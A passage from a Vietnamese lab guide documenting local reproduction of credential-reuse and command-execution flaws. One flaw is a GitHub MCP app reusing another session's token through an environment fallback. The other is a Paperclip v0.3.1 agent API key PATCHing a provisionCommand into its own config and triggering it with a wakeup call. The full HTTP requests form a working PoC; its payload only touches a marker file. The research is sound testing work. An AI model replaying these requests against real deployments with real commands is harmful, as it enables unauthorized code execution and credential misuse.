cùng các bước nhưng dùng cửa sổ B và nhập cả `LAB_OPENAI_B_20261007` lẫn
`LAB_GITHUB_B_20261007`; event phải là owner/requester B. Với Run G3 hiện tại,
sau bước A ghi checkpoint này trước khi mở B:

~~~powershell
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint after-a
~~~

### 2.3. G3 — Phiên B để trống token và tái dùng trạng thái A

1. Mở cửa sổ ẩn danh bằng **Ctrl+Shift+N**. Không dùng tab mới trong cửa sổ A.
2. Trong cửa sổ ẩn danh, mở cùng URL:
   http://127.0.0.1:19501/.
3. Nhập vào **OpenAI API Key**:

   ~~~
   LAB_OPENAI_B_20261007
   ~~~

4. Để trống hoàn toàn ô **GitHub Token**.
5. Giữ Repository và Your Query như phiên A, rồi nhấn **Run Query**.
6. Chụp JSON kết quả ngay dưới nút. Kết quả cần có:
   - requesterSession là B;
   - credentialOwner là A;
   - credentialSource là process-global os.environ fallback;
   - crossSessionCredentialUse là true.

Nếu app báo yêu cầu GitHub Token, kiểm tra lại: A phải Run Query trước B và B
phải là cửa sổ ẩn danh riêng. Không nhập chuỗi bất kỳ vào GitHub Token của B,
vì khi đó nó sẽ trở thành input của B thay vì kiểm tra fallback.

Ngay sau UI B, ghi checkpoint thứ hai. `runtime-baseline.json`,
`runtime-after-a.json` và `runtime-after-b.json` phải giữ nguyên Pod UID,
container ID, restartCount và `githubMcpPidOne.processStartTicks`.

~~~powershell
.\scripts\94-capture-ch3-run-state.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint after-b
~~~

### 2.4. Đối chiếu sink nội bộ và lưu evidence

1. Trong cửa sổ thường hoặc tab mới, mở:

   http://127.0.0.1:19580/events

2. Tìm hai record mới nhất. Chụp phần cho A và B sao cho thấy:
   requesterSession, credentialOwner, credentialSource,
   crossSessionCredentialUse và credentialSha256_20.
3. Sau khi đã có cả record A và B, chạy:

~~~powershell
Set-Location D:\daihoc\Nam4\Doan\lab
.\scripts\42-capture-github-mcp-k8s-boundary.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint final `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

4. Mở `evidence\campaigns\<CampaignId>\<RunId>\k8s\github-mcp-k8s-boundary.json`.
   Kiểm tra:
   - `workloads.githubMcp` và `workloads.credentialSink` là đúng hai Pod
     của case;
   - `networkPolicy` chỉ cho GitHub MCP egress tới credential sink (và DNS);
   - `credentialSinkEvents` có các event hash-only vừa tạo.

   Event sink chỉ chứng minh service nội bộ đã nhận effective credential
   theo hash; nó không phải log GitHub/OpenAI/MCP thật.

### 2.5. G4 — đối chứng không có state tồn dư

1. Tạo run sạch `CH3-G4-001` theo Mục 0.3.
2. Mở `http://127.0.0.1:19580/events`; JSON phải có `count: 0`.
3. Trong cửa sổ ẩn danh B, nhập `LAB_OPENAI_B_20261007`, để trống GitHub
   Token và bấm **Run Query** trước khi A thực hiện bất kỳ thao tác nào.
4. Không được xuất hiện fingerprint của A. Validation/no-event chỉ có giá trị
   âm tính khi sink còn hoạt động; kiểm tra endpoint sink trước khi kết luận.

### 2.6. Ảnh cần đưa vào báo cáo

1. **Hình GitHub-A:** cửa sổ thường sau Run Query của A.
2. **Hình GitHub-B:** cửa sổ ẩn danh sau Run Query của B, thấy
   process-global os.environ fallback và owner A.
3. **Hình GitHub-C:** URL port 19580/events với hai record hash-only.
4. **Hình GitHub-D:** inventory Kubernetes thể hiện hai workload/POD và
   NetworkPolicy egress `github-mcp-observer-egress` giới hạn đường đi tới
   credential sink nội bộ.
5. **Hình GitHub-E:** checkpoint `baseline`, `after-a`, `after-b` của G3 giữ
   cùng process identity.

Không dùng ảnh UI hoặc `crossSessionCredentialUse=true` đơn lẻ để kết luận.
G3 cần đồng thời B blank, fallback source, fingerprint A=B, event sink và
process identity không đổi.

## 3. Paperclip v0.3.1 — Agent API key đổi cấu hình thực thi

### 3.0. Một lượt Paperclip hoàn chỉnh để dùng trong báo cáo (P1–P11)

Toàn bộ P1–P11 phải nằm trong **một Pod Paperclip** và một Run ID. Nếu Pod
restart, reset namespace hoặc marker tồn tại sẵn, bỏ Run và làm lại bằng Run
ID mới. Chỉ dùng `http://127.0.0.1:19310/`; không dùng instance ở port `3100`.

**P1 — dùng reset/baseline Phase B ở Mục 0.2.** Đây là reset chung thứ hai,
được thực hiện sau khi GitHub G3 đã hoàn tất; nó xóa Company/Agent/Issue/Run/
API key cũ trong namespace lab. Không chạy lại `93-reset-active-lab.ps1` nếu
vừa thực hiện Phase B. Biến phải đang là `$Campaign = 'CH3-20261015'` và
`$Run = 'CH3-PAPERCLIP-L2-002'`; file
`evidence\campaigns\$Campaign\$Run\runtime-baseline.json` phải tồn tại. Chỉ
tiếp tục khi output reset có `paperclipCompanyCount : 0` và
`paperclipMarker : MARKER_ABSENT`. Mở `http://127.0.0.1:19310/`, nhấn
`Ctrl+F5`; phải thấy wizard **Company / Agent / Task / Launch**.

**P2 — tạo dữ liệu nghiệp vụ đúng.** Trong wizard tạo Company `Ch3 Boundary
Lab`, CEO `CEO` với adapter **Process**, working directory `/workspace/repo`
và command `/paperclip/lab-fixtures/paperclip-local-success`; đóng wizard ở
tab Task, không tạo Task từ wizard. Sau đó tạo Project
`Ch3 Agent-key workspace evidence` tại local folder `/workspace/repo`; tạo
hai General Agent **A** `Ch3 Agent key scope` và **B**
`Ch3 General control B`, đều Process, working directory `/workspace/repo`,
command `/paperclip/lab-fixtures/paperclip-local-success`, Args trống. Cuối
cùng tạo một Issue thuộc Project này, gán cho A; ghi lại **UUID** field `id`
của Issue từ API, không dùng nhãn hiển thị `CHB-1` thay cho UUID. Các click,
giá trị ô và ảnh P2 được ghi chi tiết ngay ở Mục 3.2.1–3.2.5 bên dưới.

**P3 — business control.** Trên trang A bấm **Run Heartbeat** một lần. Chờ
run `succeeded` có `LAB_LOCAL_ADAPTER_COMPLETED`. Đây là control xác nhận
adapter Process hoạt động; nó không có ngữ cảnh Issue và không phải trigger
marker. Lưu ảnh Paperclip-11. Sau đó dùng GET Configuration của A từ Board UI
để lấy đúng `agent-id`/agent reference, `company-id` và JSON cấu hình đầy đủ
cho Repeater.

**P4 — đối chứng principal bằng key B.** Tạo key B trong Configuration của B
(copy tạm, không chụp). Không gửi Cookie Board. Thực hiện tuần tự:

1. PATCH **B → B** với Process config đầy đủ đang có của B, không thêm
   `provisionCommand`; phải trả 200 và GET lại B không đổi cấu hình hợp lệ.
2. Dùng đúng key B, PATCH **B → A**, gửi toàn bộ config A nhưng chỉ đổi
   `timeoutSec` thành `6`; phải bị từ chối **và** GET A sau đó vẫn giữ nguyên
   config ban đầu.

Request mẫu, cách lấy body đầy đủ và điều kiện dừng nằm ở Mục 3.4 ngay bên
dưới. Nếu B→A được chấp nhận hoặc request bị coi là Board, dừng case: không
được gọi PATCH A sau đó là privilege escalation.

**P5 — tạo key A và T0.** Trên Configuration của A tạo key
`ch3-agent-key-boundary-test`; copy token tạm, xóa Cookie Board khỏi
Repeater. Trước PATCH chạy:

~~~powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint T0 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

T0 phải có `markerPresent : False` và lưu Pod UID/image ID/container ID.

**P6 — PATCH A với marker vô hại.** Với key A và request-target của A, gửi
body Process đầy đủ có `workspaceStrategy.type = git_worktree`,
`branchTemplate = ch3-agent-key-evidence` và:

~~~text
provisionCommand = touch /workspace/repo/.paperclip/lab-agent-key-scope-marker
~~~

PATCH phải trả 200. Gửi GET A để xác nhận server đã lưu toàn bộ
`workspaceStrategy`; che giá trị sau `Bearer ` trước khi chụp. Payload HTTP
chuẩn đầy đủ ở Mục 3.5; không thay `/workspace/repo` bằng đường dẫn Windows.

**P7 — T1 sau PATCH.** Ngay sau GET xác nhận cấu hình, trước khi wakeup, chạy:

~~~powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint T1 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

T1 vẫn phải `markerPresent : False`. Điều này phân biệt việc lưu cấu hình với
tác động của một run sau đó.

**P8 — wakeup có Issue UUID.** Không dùng `POST /heartbeat/invoke` với `{}`.
Dùng key A, endpoint `/api/agents/<agent-a-id>/wakeup?companyId=<company-id>`
và body có `payload.issueId` là UUID Issue của P2. Lưu HTTP 202 cùng run-id;
request chuẩn, `idempotencyKey` và cách trigger L1 bằng Board (nếu L2 không
được principal A xử lý) nằm ở Mục 3.6. L2 chỉ được kết luận khi evidence cho
cả PATCH và wakeup đều là Agent A; nếu Board kích hoạt thì kết luận tối đa L1
và caption phải nói rõ Board là bên trigger.

**P9 — chờ và thu final run evidence.** Trong tab Runs, mở đúng run-id P8 và
chờ trạng thái cuối `succeeded`. Lưu response body của ba GET sau, sau khi
che Authorization trong ảnh/export:

~~~http
GET /api/heartbeat-runs/<paperclip-run-id>
GET /api/heartbeat-runs/<paperclip-run-id>/events?afterSeq=0&limit=200
GET /api/heartbeat-runs/<paperclip-run-id>/log?offset=0&limitBytes=262144
~~~

Run ID phải trùng P8; log không được có `No project or prior session workspace
was available` hoặc `/instances/default/workspaces/...`. `succeeded` đơn lẻ
không đủ nếu chưa có status/log này.

**P10 — T2 và phạm vi filesystem.** Chỉ sau khi P9 hoàn tất, chạy:

~~~powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run -Checkpoint T2 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

T0/T1 phải false, T2 phải true; Pod UID của ba file phải giống nhau. Marker
chỉ chứng minh command đã tạo file trong `emptyDir` workspace của Pod, không
chứng minh quyền node, Docker hoặc Kubernetes API.

**P11 — revoke và seal.** Revoke key A/B trên UI sau khi đã lưu evidence;
không đưa key thô vào ảnh, Burp export hoặc Markdown. Sau khi lưu ảnh đã che
key cùng ba response status/events/log, chạy:

~~~powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -ArtifactPath C:\evidence-redacted\paperclip-patch.png,C:\evidence-redacted\paperclip-wakeup.png,C:\evidence-redacted\paperclip-final-status.json,C:\evidence-redacted\paperclip-events.json,C:\evidence-redacted\paperclip-log.txt
~~~

Run Paperclip hoàn chỉnh phải có `runtime-baseline.json`, ba file
`paperclip-marker-T0/T1/T2.json`, final status/events/log, ảnh đã che key và
`run-seal.json`. Thiếu P9 hoặc T2 true thì chỉ báo cáo đến mức quan sát đạt
được, không gọi là chuỗi end-to-end.

#### P4–P11 chi tiết: thao tác UI, Burp Repeater và request cần gửi

Phần này là hướng dẫn thao tác liên tục sau khi đã hoàn tất P2/P3. Các ký hiệu
dùng ở các request bên dưới:

| Ký hiệu | Lấy ở đâu | Dùng cho |
|---|---|---|
| `<company-id>` | query `companyId` trong GET Configuration của A/B | mọi API Paperclip của Company |
| `<agent-a-ref>` | phần `/api/agents/...` của GET Configuration Agent A | PATCH/wakeup Agent A |
| `<agent-b-ref>` | phần `/api/agents/...` của GET Configuration Agent B | PATCH đối chứng B |
| `<issue-id>` | field `id` UUID của Issue trong GET issues | `payload.issueId` của wakeup |
| `<run-id>` | field `id` trong response wakeup HTTP 202 | status/events/log của chính run |

`agent-a-ref`/`agent-b-ref` có thể là reference/slug UI thay vì UUID. Không tự
đổi giá trị trong đường dẫn: dùng nguyên phần agent reference mà Paperclip đã
phát trong request GET Configuration tương ứng.

##### P4a. Lấy GET Configuration của B và tạo key B

1. Trong sidebar **AGENTS**, bấm `Ch3 General control B`.
2. Bấm tab **Configuration**.
3. Bật Burp **Proxy > HTTP history**, refresh trang một lần (`Ctrl+R`).
4. Trong history, chọn request dạng:

   ~~~http
   GET /api/agents/<agent-b-ref>?companyId=<company-id> HTTP/1.1
   Host: 127.0.0.1:19310
   ~~~

5. Nhấp phải request > **Send to Repeater**. Trong Repeater, bấm **Send**.
   Nếu response là `304 Not Modified`, xóa header `If-None-Match`, rồi Send
   lại để lấy JSON đầy đủ. Lưu lại nguyên object `adapterType` và
   `adapterConfig` của B; PATCH thay thế cả `adapterConfig`, không chỉ thay
   một field con.
6. Quay lại UI Configuration B, cuộn xuống **API Keys**. Trong ô
   `Key name (e.g. production)`, nhập `ch3-general-b-control`, bấm
   **Create**, rồi copy key B tạm thời để dùng trong Repeater.

##### P4b. Request self-update B → B

Trong Repeater, duplicate GET B; đổi method thành `PATCH`, xóa header
`Cookie` và `If-None-Match`, thêm header Authorization key B. Giữ đúng
`<agent-b-ref>`/`<company-id>` lấy từ GET B. Gửi request:

~~~http
PATCH /api/agents/<agent-b-ref>?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Content-Type: application/json
Authorization: Bearer <agent-b-api-key>
Connection: close

{
  "adapterType": "process",
  "adapterConfig": {
    "cwd": "/workspace/repo",
    "command": "/paperclip/lab-fixtures/paperclip-local-success",
    "args": [],
    "timeoutSec": 5
  }
}
~~~

Kết quả cần thấy: HTTP `200`, response `id` là Agent B. Quay lại UI B,
`Ctrl+R` tab Configuration, kiểm tra Adapter vẫn là Process, working directory
vẫn `/workspace/repo` và command vẫn là fixture local.

##### P4c. Request cross-update B → A

1. Trong sidebar bấm Agent A `Ch3 Agent key scope` > **Configuration** >
   refresh trang; đưa GET A sang một tab Repeater khác như P4a.
2. Copy toàn bộ `adapterConfig` từ response GET A. Giữ toàn bộ field đang có;
   chỉ đổi `timeoutSec` thành `6`.
3. Dùng **vẫn key B** gửi request đến reference của A:

~~~http
PATCH /api/agents/<agent-a-ref>?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Content-Type: application/json
Authorization: Bearer <agent-b-api-key>
Connection: close

{
  "adapterType": "process",
  "adapterConfig": {
    "cwd": "/workspace/repo",
    "command": "/paperclip/lab-fixtures/paperclip-local-success",
    "args": [],
    "timeoutSec": 6
  }
}
~~~

4. Request cross-update phải bị từ chối. HTTP status có thể khác nhau theo
   auth mode; điều kiện bắt buộc là GET A qua Board UI sau đó vẫn có
   `timeoutSec: 5` và không có field nào của A thay đổi. Nếu response là 200
   hoặc GET A thấy `timeoutSec: 6`, dừng Paperclip L1/L2 tại đây.

##### P5a. Tạo key A, lấy request A và đo T0

1. Giữ Agent A > **Configuration** đang mở. Cuộn xuống **API Keys**.
2. Nhập `ch3-agent-key-boundary-test` tại `Key name (e.g. production)`, bấm
   **Create**, copy key A tạm thời.
3. Trước khi gửi PATCH bất kỳ, trong PowerShell đang giữ `$Campaign/$Run`,
   chạy T0:

   ~~~powershell
   .\scripts\44-check-paperclip-scope-marker.ps1 `
     -CampaignId $Campaign -RunId $Run `
     -Checkpoint T0 `
     -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
   ~~~

4. Chỉ tiếp tục khi T0 có `markerPresent : False`.
5. Từ GET A đã đưa sang Repeater ở P4c, duplicate request đó, đổi method
   thành PATCH, xóa `Cookie` và `If-None-Match`, thêm `Authorization: Bearer
   <agent-a-api-key>`.

##### P5b. PATCH A để lưu provisionCommand

Giữ request-target của A và gửi body chính xác sau:

~~~http
PATCH /api/agents/<agent-a-ref>?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Content-Type: application/json
Authorization: Bearer <agent-a-api-key>
Connection: close

{
  "adapterType": "process",
  "adapterConfig": {
    "cwd": "/workspace/repo",
    "command": "/paperclip/lab-fixtures/paperclip-local-success",
    "args": [],
    "timeoutSec": 5,
    "workspaceStrategy": {
      "type": "git_worktree",
      "branchTemplate": "ch3-agent-key-evidence",
      "provisionCommand": "touch /workspace/repo/.paperclip/lab-agent-key-scope-marker"
    }
  }
}
~~~

Kết quả cần là HTTP `200`. Gửi lại GET A bằng Board UI/Repeater để xác nhận
response có `adapterConfig.workspaceStrategy.provisionCommand`. HTTP 200 mới
chứng minh server đã lưu config; command chưa được chạy ở bước này.

##### P5c. Đo T1 sau PATCH, trước wakeup

~~~powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint T1 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

T1 phải giữ `markerPresent : False`. Nếu T1 đã True, dừng và reset toàn bộ
Phase B; marker không còn là tác động mới của run wakeup.

##### P6a. Lấy Issue UUID từ UI/Burp

1. Trong sidebar bấm **Issues**, refresh trang một lần.
2. Trong Burp history, mở request:

   ~~~http
   GET /api/companies/<company-id>/issues HTTP/1.1
   Host: 127.0.0.1:19310
   ~~~

3. Trong response JSON, tìm Issue có `identifier` là `CHB-1` (hoặc mã thực tế
   UI đã phát). Copy field `id` UUID của đúng object đó làm `<issue-id>`.
   Không dùng chữ `CHB-1` tại `payload.issueId`.

##### P6b. Gửi wakeup có ngữ cảnh Issue

Tạo tab Repeater mới hoặc duplicate PATCH A. Dùng Agent A reference, key A và
Issue UUID vừa lấy:

~~~http
POST /api/agents/<agent-a-ref>/wakeup?companyId=<company-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Content-Type: application/json
Authorization: Bearer <agent-a-api-key>
Connection: close

{
  "source": "on_demand",
  "triggerDetail": "manual",
  "reason": "chapter3-agent-key-boundary-evidence",
  "payload": {
    "issueId": "<issue-id>"
  },
  "idempotencyKey": "ch3-paperclip-l2-002"
}
~~~

Kết quả cần là HTTP `202 Accepted`; copy field `id` trong response thành
`<run-id>`. Không dùng endpoint `/heartbeat/invoke` hay body `{}`: chúng không
mang Issue UUID nên Paperclip có thể dùng fallback workspace thay vì
`/workspace/repo`.

##### P7a. Theo dõi run trên UI

1. Quay lại Agent A, bấm tab **Runs** và refresh.
2. Chọn run có ID khớp `<run-id>` từ response P6b.
3. Chờ trạng thái cuối `succeeded`. Nếu trạng thái còn `queued`/`running`,
   chưa chạy T2.
4. Mở phần transcript/log trên cùng trang. Không được có dòng
   `No project or prior session workspace was available` hoặc đường dẫn
   `/instances/default/workspaces/...`.

##### P7b. Lấy final status, events và log qua Repeater

Duplicate một request dùng key A trong Repeater và gửi lần lượt:

~~~http
GET /api/heartbeat-runs/<run-id> HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Authorization: Bearer <agent-a-api-key>
~~~

~~~http
GET /api/heartbeat-runs/<run-id>/events?afterSeq=0&limit=200 HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Authorization: Bearer <agent-a-api-key>
~~~

~~~http
GET /api/heartbeat-runs/<run-id>/log?offset=0&limitBytes=262144 HTTP/1.1
Host: 127.0.0.1:19310
Accept: application/json
Authorization: Bearer <agent-a-api-key>
~~~

Ba response phải thuộc cùng `<run-id>` của P6b. Lưu final status/events/log
làm evidence của Run này.

##### P7c. Chạy T2 và niêm phong Run

Chỉ sau P7a/P7b, chạy:

~~~powershell
.\scripts\44-check-paperclip-scope-marker.ps1 `
  -CampaignId $Campaign -RunId $Run `
  -Checkpoint T2 `
  -EvidenceRoot ".\evidence\campaigns\$Campaign\$Run\k8s"
~~~

Kết quả đầy đủ là T0/T1 `markerPresent : False`, T2
`markerPresent : True`, ba checkpoint cùng Pod UID và final status/log cùng
`<run-id>`. Sau đó seal:

~~~powershell
.\scripts\95-seal-ch3-run-evidence.ps1 `
  -CampaignId $Campaign -RunId $Run
~~~

### 3.1. Điều cần chứng minh

Người vận hành qua Board UI có quyền cấu hình Agent. Agent API key là principal
khác; thí nghiệm đánh giá liệu Agent có sửa được trường cấu hình khiến server
thực thi command trong workspace hay không. UI không có trường
`provisionCommand`; request phải đi qua API để phân biệt rõ Agent API key với
cookie Board.

Có hai mức kết luận. **L1** xác nhận Agent A kiểm soát được cấu hình và một
trigger đã biết khiến server thực thi nó; trigger có thể là Board nhưng phải
ghi đúng principal đó. **L2** chỉ được kết luận khi Agent A tự làm cả PATCH và
wakeup bằng Agent API key. `contextSnapshot` chỉ là evidence hỗ trợ; principal
PATCH phải được đối chiếu bằng source auth/route đúng Campaign và đối chứng
General Agent B hợp lệ.

Marker an toàn là:

~~~
/workspace/repo/.paperclip/lab-agent-key-scope-marker
~~~

Workspace này là emptyDir trong Pod Paperclip. Marker không chứng minh truy
cập host, node, Docker socket hay API Kubernetes.

### 3.2. Dựng lại dữ liệu Paperclip từ trạng thái trống

**Bắt buộc bắt đầu bằng P1/Phase B của Mục 0.2.** Sau khi
`93-reset-active-lab.ps1` báo
`paperclipCompanyCount : 0`, mở **chỉ** URL
http://127.0.0.1:19310/ và nhấn `Ctrl+F5`. Màn hình đúng tự mở wizard bốn tab
**Company / Agent / Task / Launch**, bắt đầu ở **Company**.

Không dùng `http://127.0.0.1:3100/` hoặc Dashboard có các tên như `PTaS
Core`, `Recon Agent`, `Network Tester`, `Blackbox` hay `Kernel`. Đó là một
instance/dataset Paperclip khác ngoài namespace lab v3; không xóa, sửa, chụp
hay thêm dữ liệu vào đó. Nếu tại port `19310` vẫn thấy Dashboard, Company cũ
hoặc wizard không xuất hiện, dừng và chạy lại reset Phase B ở Mục 0.2; không tạo Company thứ
hai để “sửa” dữ liệu cũ.

Trong lab này không phân loại Company/Project theo pentest black-box, kernel
hay các chức danh Recon. Cấu trúc đúng duy nhất cho case là `Ch3 Boundary Lab`
→ `Ch3 Agent-key workspace evidence` → Issue `CHB-1`, với CEO và một General
Agent. Những tên pentest khác làm sai bối cảnh evidence và không được đưa vào
ảnh báo cáo.

Image `paperclip-v0.3.1-ui-lab:chapter3-v1` dùng **UI overlay của lab**. Nó
chỉ bật lựa chọn **Process** và trường **Working directory** để tạo được một
luồng nghiệp vụ cục bộ, có thể tái lập. Nó không thay server v0.3.1, API
authorization, `workspace-runtime` hay logic `provisionCommand`. Vì vậy,
card Process là bối cảnh cấu hình của lab, không phải bằng chứng độc lập về
lỗ hổng.

> **Quy tắc đường dẫn:** Paperclip server chạy trong Pod Linux. Chỉ dùng
> `/workspace/repo`; không nhập `D:\\daihoc\\...` vào bất kỳ ô nào của
> Paperclip.

#### Bản đồ thao tác — làm theo đúng thứ tự, không bỏ bước

| Pha | Thao tác | Kết quả cần thấy | Không được suy ra |
|---|---|---|---|
| 1 | Chạy `93-reset-active-lab.ps1`, mở port `19310`, `Ctrl+F5` | Wizard Company / Agent / Task / Launch | Không dùng Dashboard ở port `3100` |
| 2 | Tạo Company và CEO Process | `Ch3 Boundary Lab`, Agent `CEO` | Chưa có PoC hay Agent API key |
| 3 | Tạo Project local `/workspace/repo`, General Agent Process và Issue | Một Issue thuộc đúng Project, gán đúng Agent | Chưa có marker |
| 4 | Bấm **Run Heartbeat** trên UI | `succeeded`, `LAB_LOCAL_ADAPTER_COMPLETED` | Đây chỉ là business baseline; marker phải vẫn vắng mặt |
| 5 | Tạo Agent API key rồi PATCH bằng Burp | HTTP 200 và `workspaceStrategy.provisionCommand` trong response | HTTP 200 chưa cho biết command đã chạy |
| 6 | Gọi `/wakeup` bằng key với UUID Issue | HTTP 202, run-id, `payload.issueId` | Không dùng `/heartbeat/invoke` với `{}` |
| 7 | Chờ run cuối `succeeded`, sau đó chạy script 44 | `markerPresent : True` | Marker chỉ là file trong `emptyDir`, không phải host/node access |
| 8 | Chụp evidence rồi revoke key | Key không còn dùng được | Revoke không xóa run/marker đã quan sát |

Nếu một pha không đạt kết quả trong cột thứ ba, dừng tại pha đó, giữ ảnh lỗi
và sửa điều kiện của pha; không chuyển sang pha tiếp theo để “thử tiếp”.

#### 3.2.1. Company và CEO — chỉ tạo, chưa tạo Task

1. Ở tab **Company**, điền đúng hai ô sau:

   | Nhãn ô trên màn hình | Giá trị cần nhập |
   |---|---|
   | `Company name` | `Ch3 Boundary Lab` |
   | `Mission / goal (optional)` | `Local-only authorization-boundary lab for Chapter 3` |

2. **Chụp Paperclip-01** trước khi bấm: phải thấy cả hai giá trị và tab
   `Company` đang được chọn.
3. Bấm **Next** một lần. Company được lưu ngay ở thao tác này; wizard chuyển
   sang tab **Agent** có tiêu đề `Create your first agent`.
4. Bên dưới các card Claude Code/Codex, bấm **More Agent Adapter Types**;
   bấm card **Process – Run a local command**. Không chọn Claude Code, Codex,
   Gemini, Cursor; không bấm `Test now`.
5. Điền CEO baseline:

   | Nhãn ô | Giá trị cần nhập |
   |---|---|
   | `Agent name` | `CEO` |
   | `Working directory` | `/workspace/repo` |
   | `Command` | `/paperclip/lab-fixtures/paperclip-local-success` |
   | `Args (comma-separated)` | để trống |

6. **Chụp Paperclip-02** trước khi bấm Next: card/combobox phải hiển thị
   `Process` và bốn giá trị trên. Không có credential nào trong ảnh.
7. Bấm **Next**. CEO được tạo và wizard chuyển qua tab **Task**.
8. **Không nhập Task title, không bấm Next và không bấm Launch.** Bấm dấu
   **×** ở góc trên phải wizard để đóng nó. Lý do: nếu hoàn tất tab Task,
   Paperclip sẽ tạo một Issue khởi tạo; Issue nghiên cứu cần được tạo riêng ở
   bước 3.2.5 để có mã đầu tiên `CHB-1`.
9. Đóng wizard không xóa Company/CEO đã được lưu. Xác nhận sidebar hiện
   `Ch3 Boundary Lab` và nhóm **Agents** có `CEO`, sau đó chụp
   **Paperclip-03** làm ảnh trạng thái baseline.

Trong onboarding, `CEO` không chỉ là tên mặc định: wizard luôn gửi role
`ceo` cho Agent đầu tiên. Màn hình không cần (và không cho) chọn role ở bước
này. Agent tạo sau qua `Agents +` là Agent thường; form của nó mặc định
`Role = General`, vì vậy ở bước 3.2.3 phải giữ/chọn `General` cho `Ch3 Agent
key scope`.

#### 3.2.2. Project và workspace của Project

1. Trong sidebar, tại dòng tiêu đề **PROJECTS**, bấm dấu **+**.
2. Hộp `New Project` mở ra. Điền:

   | Nhãn ô | Giá trị cần nhập |
   |---|---|
   | `Project name` | `Ch3 Agent-key workspace evidence` |
   | `Description` | `Disposable in-Pod workspace for Chapter 3 evidence` |

3. Ở phần `Where will work be done on this project?`, chọn **A local folder**.
4. Ở ô `Local folder (full path)`, nhập chính xác `/workspace/repo`.
5. **Chụp Paperclip-04** trước khi bấm Create: phải thấy tên Project, lựa
   chọn `A local folder` và đường dẫn Linux trên.
6. Bấm **Create Project**. Chờ dialog đóng và kiểm tra `Ch3 Agent-key
   workspace evidence` xuất hiện dưới **PROJECTS**. Chụp **Paperclip-05**.

`/workspace/repo` là Git workspace fixture chỉ nằm trong container
Paperclip. Nó không phải thư mục Windows và không cấp quyền đến node, Docker
socket hay Kubernetes API.

#### 3.2.3. Agent General dùng Process

1. Trong sidebar, tại dòng **AGENTS**, bấm dấu **+**.
2. Hộp `Add a new agent` xuất hiện. Bấm liên kết **I want advanced
   configuration myself**.
3. Hộp chọn adapter mở ra. Bấm card **Process – Run a local command**. Nếu
   danh sách dropdown hiện `Process` màu xám `Coming soon`, đó là UI/browser
   cũ: `Ctrl+F5` trang `http://127.0.0.1:19310/` rồi bắt đầu lại từ bước 1.
4. Form `New Agent` mở ra. Điền các giá trị sau, giữ nguyên những ô không có
   trong bảng:

   | Nhãn ô | Giá trị cần nhập |
   |---|---|
   | `Name` | `Ch3 Agent key scope` |
   | `Role` | `General` |
   | `Title` / description | để trống |
   | `Adapter type` | `Process` |
   | `Working directory` | `/workspace/repo` |
   | `Command` | `/paperclip/lab-fixtures/paperclip-local-success` |
   | `Args (comma-separated)` | để trống |

5. **Chụp Paperclip-06** trước khi gửi form. Ảnh cần nhìn rõ `Role: General`,
   `Adapter type: Process`, working directory và command; không cần hiển thị
   phần bên dưới không liên quan.
6. Bấm **Create Agent**. Mở Agent vừa tạo từ sidebar nếu ứng dụng chưa tự
   chuyển trang.
7. Nếu trang Agent hiện dòng `This agent is pending board approval and cannot
   be invoked yet`, bấm **Inbox** trên sidebar. Trong nhóm **Approvals**, tìm
   card `Hire agent` dành cho `Ch3 Agent key scope`, rồi bấm **Approve**.
   Nếu không có trạng thái pending thì bỏ qua bước này. Quay lại Agent và chỉ
   tiếp tục khi không còn dòng pending/pause.
8. Chụp **Paperclip-07**: trang Agent phải hiển thị `Ch3 Agent key scope` và
   trạng thái có thể chạy. Đây là ảnh tách biệt với ảnh Agent API key ở sau.

9. Lặp lại bước 1–8 để tạo **Agent B** với cùng Adapter/working directory/
   command, nhưng Name là `Ch3 General control B` và Role vẫn là **General**.
   Không cấp `canCreateAgents`, capability hoặc permission grant quản lý agent
   khác. Nếu B pending thì approve đúng như bước 7. Chụp một ảnh cho thấy A và
   B đều là General Agent khả dụng.

Agent A là `Ch3 Agent key scope`, mục tiêu PATCH/runtime. Agent B là đối chứng
quyền hợp lệ: key B phải sửa được cấu hình thông thường của B nhưng không được
sửa bản ghi A. Không dùng Bearer sai làm đối chứng chính, vì mode local có thể
fallback về Board.

#### 3.2.4. Kiểm tra cấu hình hợp lệ trước khi tạo Issue

1. Trên Agent `Ch3 Agent key scope`, chọn tab **Configuration**.
2. Kiểm tra lần cuối các trường UI: `Process`, `/workspace/repo`, command
   `/paperclip/lab-fixtures/paperclip-local-success`, Args trống.
3. Cuộn toàn bộ trang Configuration. Xác nhận **không có** ô tên
   `provisionCommand` hoặc `workspaceStrategy`. Đây là điều cần ghi trong
   caption: người vận hành cấu hình Process hợp lệ qua UI, còn trường nhạy cảm
   không được expose bởi UI.
4. **Chụp Paperclip-08** cho tab Configuration. Không tạo API key ở bước này.

#### 3.2.5. Tạo đúng một Issue nghiên cứu (`CHB-1`)

1. Bấm **New Issue** ở đầu sidebar. Hộp `New Issue` mở ra.
2. Nhập title `Ch3 Agent API key execution-context evidence`.
3. Mở phần mô tả rồi nhập:

   ~~~text
   Local-only task used to validate the Paperclip authorization boundary.
   ~~~

4. Chọn **Status** = `Todo`; chọn **Assignee** = `Ch3 Agent key scope`; chọn
